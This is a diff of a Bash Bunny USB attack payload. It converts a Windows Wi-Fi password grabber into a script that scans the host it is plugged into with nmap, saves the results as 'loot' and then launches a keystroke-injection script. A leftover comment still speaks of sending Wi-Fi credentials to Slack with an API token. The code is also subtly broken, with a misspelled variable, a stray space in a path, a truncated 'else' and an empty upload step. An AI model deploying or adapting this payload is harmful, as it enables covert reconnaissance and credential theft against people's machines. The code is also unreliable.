@@ -1,12 +1,13 @@
 #!/bin/bash
 
-# @title: WiFi Windows password grabber for the bash bunny
+# @title: Nmap to Slack for Bashbunny
 # @author: Harsimran Sidhu
 # @version: 1.0
 # @target: Windows 10
 #
 #
-# @details: This is a simple Wifi password grabber tested and working for Windows 10, 
+# @details: This attack will attempt to upload nmap result to slack , or 
+# save it in the loot doc
 # Scripts is able to load wifi creds to slack by using your SLACK api token.
 #
 #
@@ -16,17 +17,46 @@
 #         Red: failure to load dependency ducky script
 #
 
+NMAP_OPTIONS="-O --fuzzy"
+LOOTDIR=/root/udisk/loot/nmap
 
-ATTACKMODE HID STORAGE
 
 LED SETUP
 
+ATTACKMODE RNDIS_ETHERNET
+GET TARGET_IP
+GET TARGET_HOSTNAME
+
 GET SWITCH_POSITION
 
+####> MAke LOOT dir
+mkdir -p $LOOTDIR
+HOST=${TARGET_HOSTNAME}
+#if hostname is blank set it to "nonames"
+[[ -z "$HOSt" ]] && HOST="noname"
+COUNT=$(ls -lad $ LOOTDIR/$HOST*.log | wc -l)
+COUNT=$((COUNT+1))
+
+###> ERROR NO IP <!!!
+if [ -z "${TARGET_IP}" ]; then
+    LED FAIL
+	exit 1
+fi
+
+###>ATTACK !
+LED ATTACK
+nmap $NMAP_OPTIONS $TARGET_IP >> $LOOTDIR/$HOST-$COUNT.log
+
+####> uploading to slack 
+LED STAGE1
+sync
+
+
+
 if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky_script.txt" ]; then
-        QUACK ${SWITCH_POSITION}/ducky_script.txt
-        LED FINISH
-else
+       QUACK ${SWITCH_POSITION}/ducky_script.txt
+          LED FINISH
+els
     LED FAIL
     echo "Unable to load ducky_script.txt" >> /root/debuglog.txt
         exit 1
